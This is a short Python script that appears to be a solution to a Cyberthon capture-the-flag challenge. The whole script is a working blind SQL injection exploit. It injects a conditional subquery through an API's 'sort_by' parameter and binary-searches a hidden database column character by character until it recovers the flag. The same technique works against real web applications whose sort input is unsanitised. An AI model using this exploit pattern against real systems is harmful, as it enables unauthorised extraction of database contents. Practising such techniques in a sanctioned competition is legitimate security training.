import requests, time

url = "http://chals.f.cyberthon25.ctf.sg:50131/api/gpus"
target = "RGB 6090"
known = "Cyberthon{"
false_id = 2
s = requests.Session()
res = known
i = len(known) + 1

while True:
    l, h, best = 32, 126, -1
    while l <= h:
        m = (l + h) // 2
        c = chr(m)
        esc = "''" if c == "'" else c
        q = f"(SELECT SUBSTR(architecture, {i}, 1) FROM gpus WHERE name='{target}') > '{esc}'"
        p = {'sort_by': f"CASE WHEN {q} THEN name ELSE id END", 'sort_order': 'asc', 'page': 1, 'per_page': 9}
        try:
            time.sleep(0.1)
            r = s.get(url, params=p, timeout=10).json()
            fid = r['data'][0]['id']
            if fid == false_id:
                h, best = m - 1, m
            else:
                l = m + 1
        except: time.sleep(2)

    ch = chr(best if 32 <= best <= 126 else l)
    res += ch
    print(res)
    if ch == "}": break
    i += 1